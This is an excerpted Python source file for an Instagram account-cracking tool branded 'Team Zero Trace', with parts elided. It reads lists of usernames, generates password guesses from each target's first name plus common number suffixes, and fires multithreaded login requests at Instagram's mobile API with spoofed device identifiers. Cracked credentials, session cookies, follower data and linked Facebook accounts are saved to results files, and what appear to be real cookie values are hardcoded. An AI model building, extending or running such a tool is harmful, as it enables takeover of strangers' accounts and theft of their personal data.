...
import os, requests, json, random, uuid, re, datetime, time, rich, pytz, hashlib, base64, httpx
...
success_file_insta = f"results/𝚊𝚌𝚌𝚘𝚞𝚗𝚝𝚜-𝙾𝙺-𖤍-.txt"
checkpoint_file_insta = f"results/𝚊𝚌𝚌𝚘𝚞𝚗𝚝𝚜-𝙲𝙿-⚠-.txt"
success_detector_insta = f"results/𝚝𝚎𝚜𝚝-𝚌𝚙>𝚘𝚔-✪-.txt"
checkpoint_detector_insta = f"results/𝚊𝚌𝚌𝚘𝚞𝚗𝚝𝚜-𝙲𝙿-⚠-.txt"
...
def banner():
 ...
 _____                      ______                         *
/__  /  ___  _________     /_  __/________ _________        *
  / /  / _ \/ ___/ __ \     / / / ___/ __ `/ ___/ _ \    *
 / /__/  __/ /  / /_/ /    / / / /  / /_/ / /__/  __/   *
/____/\___/_/   \____/    /_/ /_/   \__,_/\___/\___/    *
                                                     
                                               

        [bold red] 𝚂𝚝𝚊𝚢 𝙷𝚊𝚛𝚍 - 𝚃𝚎𝚊𝚖 𝚉𝚎𝚛𝚘 𝚃𝚛𝚊𝚌𝚎[/]
"""
...
class UserAgent:
    def instagram_app(self):
        ...
        return(random.choice([
            ...
            #   f'Barcelona {self.versi_istagram} Android ({self.device_android}; {self.dpi}; {self.pxl}; VIVO; {str(random.choice(self.vivo2))}; {str(random.choice(self.vivo))}; qcom; in_ID; {self.kode2})',jjj
          #    f'Barcelona {self.versi_istagram} Android ({self.device_android}; {self.dpi}; {self.pxl}; poco; {str(random.choice(self.poco))}; {str(random.choice(self.poco))}; q#com; in_ID; {self.kode})',
...
class Instagram:
    ...
    def logo(self):
        ...
        banner()
        print("")
        menu = """[bold white]01. 𝙲𝚛𝚊𝚌𝚔 𝚏𝚛𝚘𝚖 𝚏𝚒𝚕𝚎                
02. 𝚃𝚎𝚜𝚝 𝚅1                      
03. 𝚃𝙴𝚂𝚃 𝚅2                 """
        KenXinDev(Panel(menu, subtitle="[bold bright_black]╭──────", width=80, subtitle_align='left', style='bold bright_black', title="[bold bright_black]>> [ 𝙼𝚎𝚗𝚞 𝙰𝚝𝚝𝚊𝚌𝚔 ] <<", title_align='center'))
    def MENU_VIEW(self):
        self.logo()
        choose = KenXin_Input()
        if choose in ['0', '00']:
            try:
                ...
                pass
            KenXin_Error('𝚗𝚘𝚝 𝚏𝚘𝚞𝚗𝚍')
            sleep(3)
            self.check_cookie()
        elif choose in ['1', '01']:
            inputs = self.load_input_from_file()
            if inputs:
                global dumps
                dumps = [f"{u}<=>{p}" for u, p in inputs]
                self.settings()
        ...
        with Executor(max_workers=30) as shinkai:
            for username_and_fullname in dumps:
                    try:
                        ...
                        time.sleep(3)
        print()
        KenXinDev(Panel('[bold white] 𝙲𝙿 & 𝙾𝙺 : [bold green]{}[/bold green]/[bold yellow]{}[/bold yellow][/]'.format(len(success), len(checkpoint)), width=80, style='bold bright_black', title='[bold bright_black]>> [𝙸𝚗𝚜𝚝𝚊𝚐𝚛𝚊𝚖 𝙸𝚗𝚏𝚘] <<[/]'))
        time.sleep(3)
        exit()
#::؛+
#::؛+
...
#::؛+
        ...
        try:
            with open(file_path, 'r', encoding='utf-8') as f:
                for line in f:
                    ...
                    inputs.append((username.strip(), password.strip()))
            if not inputs:
                KenXin_Warning(f"𝚗𝚘𝚝 𝚏𝚘𝚞𝚗𝚍")
            return inputs
        except FileNotFoundError:
            KenXin_Error(f"𝚗𝚘𝚝 𝚏𝚘𝚞𝚗𝚍")
            return []
        except Exception as e:
            KenXin_Error(f"𝚗𝚘𝚝 𝚏𝚘𝚞𝚗𝚍")
            return []#&&
    ...
    def generate_passwords(self, name, kombinasi, zx=''):
        ...
        # أخذ الكلمة الأولى بالكامل وتحويلها لأحرف صغيرة
        parts = name.split(' ')
        if not parts or len(parts[0]) < 3:
            return []  # إذا لم توجد كلمة أولى أو أقل من 3 أحرف
        first_name = parts[0].lower()  # الكلمة الأولى كاملة

        generated_passwords = []

        if kombinasi in ['1', '01']:
            generated_passwords.extend([
                first_name + '123',
                first_name + '1234',
                first_name + '12345',
                first_name + '123456',
            ...
            generated_passwords.extend([
                ...
                first_name + '000',
                first_name + '999',
                first_name + first_name + '2025'
            ])
            generated_passwords.extend([pwd.strip() for pwd in zx.split(',') if pwd.strip()])
        elif kombinasi in ['3', '03']:
            base = [
                first_name + 'abc', first_name + 'xyz', first_name + '0000', first_name + '1111', first_name + '1212'
            ]
            generated_passwords.extend(base + [pwd.strip() for pwd in zx.split(',') if pwd.strip()])
        elif kombinasi in ['4', '04']:
            generated_passwords.extend([pwd.strip() for pwd in zx.split(',') if pwd.strip()])
        elif kombinasi in ['5', '05']:
            generated_passwords.extend([pwd.strip() for pwd in zx.split(',') if pwd.strip()])

        # فلترة كلمات المرور الأقل من 6 أحرفتj
    ...
    def crack(self, user, password):
        ...
        for passwd in password:
            try:
                ...
                with curl.stream("POST", 'https://i.instagram.com/api/v1/bloks/apps/com.bloks.www.bloks.caa.login.async.send_login_request/', data=data, timeout=60) as response:
                    response_text = ""
                    max_bytes = 3500
                ...
                if 'Impossible d’enregistrer vos informations de connexion' in str(response_text):
                    console = Console()
       
                    render = Panel(
        "[bold green]𝚄𝚜𝚎𝚛[bold white]: [bold #00C8FF]{}[bold white] | [bold green]𝙿𝚊𝚜𝚜[bold white]: [bold #00C8FF]{}".format(user, passwd),
        style='bold green', width=80, title='[bold bright_black]>> [ 𝙾𝙺 ] <<[/]'
    )
                    open(success_file_insta,'a').write('{}|{}|\n'.format(user, passwd))
                elif 'redirect_login_challenges' in str(response_text):
                    checkpoint.append(user)
                    console = Console()
       
                    render = Panel(
        "[bold yellow]𝚄𝚜𝚎𝚛[bold white]: [bold #00C8FF]{}[bold white] | [bold yellow]𝙿𝚊𝚜𝚜[bold white]: [bold #00C8FF]{}".format(user, passwd),
        style='bold yellow', width=80, title='[bold bright_black]>> [ 𝙲𝚑𝚎𝚌𝚔𝚙𝚘𝚒𝚗𝚝1 ] <<[/]'
    )
                    console.print(render)
                    open(checkpoint_file_insta,'a').write('{}|-----|{}|\n\n'.format(user, passwd))
                elif 'i.instagram.com' in str(response_text):
                    checkpoint.append(user)
                    console = Console()
       
                    render = Panel(
        "[bold red]𝚄𝚜𝚎𝚛[bold white]: [bold #00C8FF]{}[bold white] | [bold red]𝙿𝚊𝚜𝚜[bold white]: [bold #00C8FF]{}".format(user, passwd),
        style='bold yellow', width=80, title='[bold bright_black]>> [ 𝙲𝚑𝚎𝚌𝚔𝚙𝚘𝚒𝚗𝚝 ] <<[/]'
    )
                    console.print(render)
    ...
    def check_results_crack(self):
        for i in os.listdir('results/'):
            ...
            KenXinDev("[bold bright_black]   ──> [bold white]{} : [bold green]{}[/bold green] [/]".format(i, line_info))
        KenXinDev(Panel("[bold white] 𝙶𝚘𝚘𝚍 𝚕𝚞𝚌𝚔 𝚁𝚊𝚢𝚎𝚗 𝙶𝚊𝚖𝚖𝚘𝚞𝚍𝚒[/]",subtitle="[bold bright_black]╭──────", width=80, subtitle_align='left', style='bold bright_black', title="[bold bright_black]>> [ 𝙽𝚊𝚖𝚎 𝙵𝚒𝚕𝚎 ] <<", title_align='center'))
        try:
            file_input = KenXin_Input()
            if not os.path.isfile(f'results/{file_input}'):
                KenXin_Error('𝚗𝚘𝚝 𝚏𝚘𝚞𝚗𝚍 𝚏𝚒𝚕𝚎')
                sleep(3)
                self.check_results_crack()
        ...
        with requests.Session() as r:
            try:
                ...
                if 'fbAccount' in response:
                    ...
                    # إضافة تاريخ إنشاء الحساب
                    self.tahun_fb = self.tahun(self.username) if self.username else "Unknown"
                else:
                    self.nama = None
                    self.username = None
                    self.tahun_fb = None
                ...
                self.tahun_fb = 'Unknown'
            return "[bold #00C8FF]𝙸𝙳 [bold white]: [bold red]{} [bold white]| [bold #00C8FF]𝙳𝚊𝚝𝚎[bold white] : [bold red]{}".format(self.username, self.tahun_fb)
    def settings(self):
        print("")
        KenXinDev(Panel('[bold white]  𝚜𝚎𝚎 𝚌𝚑𝚎𝚌𝚔𝚙𝚘𝚒𝚗𝚝 [bold yellow]y[bold white]/[bold red]n[/bold yellow] ', style='bold bright_black', width=80, title='[bold bright_black]>> [ 𝙲𝚑𝚎𝚌𝚔𝚙𝚘𝚒𝚗𝚝 𝚂𝚎𝚝𝚝𝚒𝚗𝚐𝚜 ] <<', subtitle='[bold bright_black]╭──────', subtitle_align='left'))
        memeg = KenXin_Input()
        if memeg.lower() == 'y':
            ...
            display_cp.append('n')
        print("")
        KenXinDev(Panel('''[bold white]01. 𝙽𝚊𝚖𝚎 1-4            02. 𝙽𝚊𝚖𝚎 1-5
03. 𝙽𝚊𝚖𝚎 1-6            04. 𝙽𝚊𝚖𝚎 1-6 + &&&
05. 𝚕𝚒𝚜𝚝 𝙿𝚊𝚜𝚜𝚠𝚘𝚛𝚍𝚜      00. 𝙱𝚊𝚌𝚔 𝚝𝚘 𝙼𝚎𝚗𝚞[/]''', style='bold bright_black', width=80, title='[bold bright_black]>> [ 𝙿𝚊𝚜𝚜𝚠𝚘𝚛𝚍 𝚂𝚎𝚝𝚝𝚒𝚗𝚐𝚜 ] <<', subtitle='[bold bright_black]╭──────', subtitle_align='left'))
        ...
        if kombinasi == '01' or kombinasi == '1':
            ...
            KenXinDev(Panel('[bold white].[/]',style='bold bright_black', width=80, title='[bold bright_black]>> [ 𝚕𝚒𝚜𝚝 𝙿𝚊𝚜𝚜𝚠𝚘𝚛𝚍 ] <<', subtitle='[bold bright_black]╭──────', subtitle_align='left'))
            manual_password = KenXin_Input()
            if not manual_password:
                KenXin_Warning('𝚗𝚘𝚝 𝚏𝚘𝚞𝚗𝚍')
                sleep(3)
                self.settings()
            self.exec_method(kombinasi, manual_password)
        elif kombinasi == '05' or kombinasi == '5':
            KenXinDev(Panel('[bold white] 𝚗𝚘𝚝 𝚏𝚘𝚞𝚗𝚍.[/]', style='bold bright_black', width=80, title='[bold bright_black]>> [ 𝚕𝚒𝚜𝚝 𝙿𝚊𝚜𝚜𝚠𝚘𝚛𝚍 ] <<', subtitle='[bold bright_black]╭──────', subtitle_align='left'))
            manual_password = KenXin_Input()
            if not manual_password:
                KenXin_Warning('𝚗𝚘𝚝 𝚏𝚘𝚞𝚗𝚍!!')
                sleep(3)
            ...
            KenXin_Warning('𝙴𝚛𝚛𝚘𝚛')
            time.sleep(3)
            self.settings()

    def info(self):
        print("")
        KenXinDev(Panel('[bold white] 𝙶𝚘𝚘𝚍 𝚕𝚞𝚌𝚔 𝚁𝚊𝚢𝚎𝚗 𝙶𝚊𝚖𝚖𝚘𝚞𝚍𝚒[/]', style='bold bright_black', width=80, title='[bold bright_black]>> [ 𝙸𝚗𝚜𝚝𝚊𝚐𝚛𝚊𝚖 𝚒𝚗𝚏𝚘 ] <<')) 
        memeg = []
        memeg.append(Panel('[bold green]{}[/]'.format(success_file_insta), style='bold bright_black', title='[bold bright_black]>> [𝚂𝚞𝚌𝚌𝚎𝚜𝚜 𝚂𝚊𝚟𝚎𝚍 𝚒𝚗] <<'))
        memeg.append(Panel('[bold yellow]{}[/]'.format(checkpoint_file_insta), style='bold bright_black', title='''[bold bright_black]>> [𝙲𝚑𝚎𝚌𝚔𝚙𝚘𝚒𝚗𝚝 𝚂𝚊𝚟𝚎𝚍 𝚒𝚗] <<
        '''))
    ...
    def validate_results(self, user, passwd, len_results):
        ...
        try:
            curl.headers.update({
                        ...
                        "Priority": "u=3",
                        "User-Agent": useragent_generate,
                        "Accept-Language": "fr-TN,fr;q=0.9,ar-TN;q=0.8,ar;q=0.7,en-US;q=0.6,en;q=0.5",
                        "X-Mid": self.helper.get_random_machine_id(),
                        "Ig-Intended-User-Id": "0",
                        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                        "Accept-Encoding": "gzip, deflate, br",
            ...
            if 'logged_in_user' in str(response):
                ...
                render = Panel(
                        "[bold green]𝚄𝚜𝚎𝚛[bold white]: [bold #00C8FF]{} [bold white]| "
                        "[bold green]𝙿𝚊𝚜𝚜[bold white]: [bold #00C8FF]{}\n\n"
                        "[bold green]𝙵𝚞𝚕𝚕𝚗𝚊𝚖𝚎[bold white]: [bold #00C8FF]{}\n"
                        "[bold green]𝙵𝚘𝚕𝚕𝚘𝚠𝚎𝚛[bold white]: [bold #00C8FF]{}\n"
                        "[bold green]𝙵𝚘𝚕𝚕𝚘𝚒𝚗𝚐[bold white]: [bold #00C8FF]{}\n"
                        "[bold green]𝙿𝚘𝚜𝚝[bold white]: [bold #00C8FF]{}\n\n"
                        "[bold green]User-Agent[bold white]: [bold #00C8FF]{}\n\n"
                        "[bold green]𝙲𝚘𝚘𝚔𝚒𝚎𝚜[bold white]: [bold #00C8FF]csrftoken=dkutYdSn3FNeo2eBmbUQc-; dpr=1.6687500476837158; datr=5sajaB6_ec3p9DXnLuTNsCoo; ig_did=79D48659-B1EF-4149-8139-6092F57A42D4; mid=aKPG5gABAAH5ML8XVZ3ybYdwBUuY; wd=431x599ds_user_id=53606092819;;{}\n\n[bold green]𝙵𝚊𝚌𝚎𝚋𝚘𝚘𝚔[bold white]: [bold #00C8FF]{}[/]"
                        .format(user, passwd, nama, pengikut, mengikuti, postingan, useragent_generate, cookie, fb_account),
                        style='bold green'
                    )
                KenXinDev(Panel(render, style='bold bright_black', width=80, title='[bold bright_black]>> [ 𝙾𝙺 ] <<[/]'))
                open(success_detector_insta,'a').write('{}|{}|{}|csrftoken=dkutYdSn3FNeo2eBmbUQc-; dpr=1.6687500476837158; datr=5sajaB6_ec3p9DXnLuTNsCoo; ig_did=79D48659-B1EF-4149-8139-6092F57A42D4; mid=aKPG5gABAAH5ML8XVZ3ybYdwBUuY; wd=431x599ds_user_id=53606092819;;{}\n\n'.format(user, passwd, cookie, fb_account))
            elif 'challenge_required' in str(response):
                checkpoint.append(user)
                try:nama, pengikut, mengikuti, postingan = self.info_acc(user)
                except (UnboundLocalError) as e: pass
                render = Panel(
                        "[bold yellow]𝚄𝚜𝚎𝚛[bold white]: [bold #00C8FF]{} [bold white]| "
                        "[bold yellow]𝙿𝚊𝚜𝚜[bold white]: [bold #00C8FF]{}\n\n"
                        "[bold yellow]𝙵𝚞𝚕𝚕𝚗𝚊𝚖𝚎[bold white]: [bold #00C8FF]{}\n"
                        "[bold yellow]𝙵𝚘𝚕𝚕𝚘𝚠𝚎𝚛[bold white]: [bold #00C8FF]{}\n"
                        "[bold yellow]𝙵𝚘𝚕𝚕𝚘𝚒𝚗𝚐[bold white]: [bold #00C8FF]{}\n"
                        "[bold yellow]𝙿𝚘𝚜𝚝[bold white]: [bold #00C8FF]{}\n\n"
                        "[bold yellow]𝙲𝚑𝚎𝚌𝚔𝚙𝚘𝚒𝚗𝚝[bold white]: [bold red]True\n\n[bold yellow]User-Agent[bold white]: [bold #00C8FF]{}[/]"
                        .format(user, passwd, nama, pengikut, mengikuti, postingan, useragent_generate),
                        style='bold yellow'
                    )
                KenXinDev(Panel(render, style='bold bright_black', width=80, title='[bold bright_black]>> [ 𝙲𝚑𝚎𝚌𝚔𝚙𝚘𝚒𝚗𝚝 ] <<[/]'))
